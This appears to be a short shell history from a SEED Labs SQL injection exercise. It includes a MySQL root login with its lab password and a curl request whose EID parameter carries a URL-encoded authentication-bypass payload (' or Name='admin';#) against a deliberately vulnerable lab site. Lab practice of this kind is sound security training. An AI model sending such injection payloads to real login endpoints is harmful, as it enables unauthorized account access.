mysql -u root -pseedubuntu
curl 'www.SeedLabSQLInjection.com/index.php?SUID=10000&Password=111'
ls
curl 'www.SeedLabSQLInjection.com/unsafe_credential.php?EID=%27+or+Name%3D%27admin%27%3B%23&Password='
echo -n "ryanwashere" |sha1sum
